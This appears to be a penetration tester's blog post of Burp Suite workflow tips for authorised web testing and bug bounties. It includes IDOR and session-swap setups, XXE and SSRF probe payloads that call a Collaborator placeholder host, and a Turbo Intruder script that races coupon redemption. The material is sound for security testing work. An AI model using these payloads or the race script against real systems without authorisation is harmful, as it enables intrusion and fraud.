---
title: "Burp Suite Advanced Tips That Saved Me Hours on Engagements"
date: 2024-11-05
tags: ["burp-suite", "web-pentesting", "tools", "productivity"]
excerpt: "Beyond the basics — Burp Suite features and workflows that most pentesters overlook but that dramatically speed up finding vulnerabilities in real applications."
published: true
platform: "blog"
---

# Burp Suite Advanced Tips That Saved Me Hours on Engagements

After a year of using Burp Suite daily at Cyber Silo and on bug bounty programs, I've accumulated a set of workflows that the official documentation doesn't emphasize. These aren't beginner tips — they're the techniques that moved me from competent to efficient.

---

## 1. Intruder Pitchfork Mode for IDOR Hunting

Most people use Intruder for brute forcing. Pitchfork mode is better for IDOR testing — it lets you iterate two or more parameters in sync.

**Use case:** Testing if user A can access user B's resources.

```
Position 1: /api/users/§1337§/orders
Position 2: Cookie: session=§userA_session§

Payload set 1: [1338, 1339, 1340]
Payload set 2: [sessionB, sessionC, sessionD]
```

This lets me test cross-account access in one sweep instead of manually swapping sessions.

---

## 2. Match and Replace Rules for Persistent Auth Bypass Tests

When testing session management, I add a Match and Replace rule to automatically swap the session cookie in every request:

**Proxy → Options → Match and Replace → Add**
- Type: Request header
- Match: `Cookie: session=.*`
- Replace: `Cookie: session=VICTIM_SESSION`

Now every request through Burp uses the victim's session. Combine this with the browser as the victim account and you'll quickly spot what data leaks across sessions.

---

## 3. Bambdas (Custom Filters) in Proxy History

Burp's Bambda filter lets you write Java-like expressions to filter the proxy history. Incredibly useful for large engagements.

```java
// Show only requests with JSON bodies containing "id"
return requestResponse.request().bodyToString().contains("\"id\"") &&
       requestResponse.request().hasHeader("Content-Type", "application/json");
```

```java
// Show only 5xx responses — server errors are worth investigating
return requestResponse.response().statusCode() >= 500;
```

```java
// Show requests to API endpoints only
return requestResponse.request().path().startsWith("/api/");
```

---

## 4. Burp Collaborator for Blind Vulnerabilities

Many high-severity vulnerabilities (SSRF, blind XSS, XXE, blind SQLi) don't produce visible output. Burp Collaborator creates a unique domain that logs interactions.

```
# In any input field, try:
https://YOUR_COLLABORATOR_ID.burpcollaborator.net

# For XXE:
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR_ID.burpcollaborator.net/xxe">
]>
<root>&xxe;</root>

# For SSRF in URL parameters:
url=http://YOUR_COLLABORATOR_ID.burpcollaborator.net/ssrf
```

Check Collaborator polling in Burp every few minutes. A DNS or HTTP hit confirms the vulnerability exists, even if you can't see the response.

---

## 5. Scope-Based Auto-Exclusion

On large programs, add out-of-scope assets to Burp's exclusion list immediately. One stray request to an out-of-scope host can get you banned.

**Target → Scope → Exclude from scope**

I also create a custom scope using regex for wildcard entries:
```
.*\.in-scope\.example\.com
```

And exclude:
```
.*\.out-of-scope\.example\.com
cdn\..*
analytics\..*
```

---

## 6. Extensions I Can't Work Without

| Extension | Purpose |
|-----------|---------|
| **Autorize** | Automatically re-sends every request with a low-priv token — flags BAC issues |
| **Turbo Intruder** | Massively faster Intruder for race condition testing |
| **J2EEScan** | Java-specific vulnerability checks |
| **Retire.js** | Detects outdated JavaScript libraries with known CVEs |
| **Logger++** | Advanced request logging with grep functionality |
| **Param Miner** | Discovers hidden query parameters and headers |

---

## 7. Race Condition Testing with Turbo Intruder

Race conditions in web apps are notoriously hard to find manually. Turbo Intruder sends requests with precise timing.

```python
# Turbo Intruder script for race condition on coupon redemption
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if 'coupon applied' in req.response:
        table.add(req)
```

I used a variation of this to find a coupon stacking vulnerability — sending 30 simultaneous redemption requests resulted in the coupon being applied 30 times.

---

## Final Thought

Burp Suite is only as powerful as the person using it. The real skill isn't knowing every feature — it's knowing which workflow fits the current target and vulnerability class. Combine these techniques with deep manual analysis and you'll find things automated scanners will never surface.

*Questions? I'm [@n16h70wl55](https://hackerone.com/n16h70wl55) on HackerOne.*
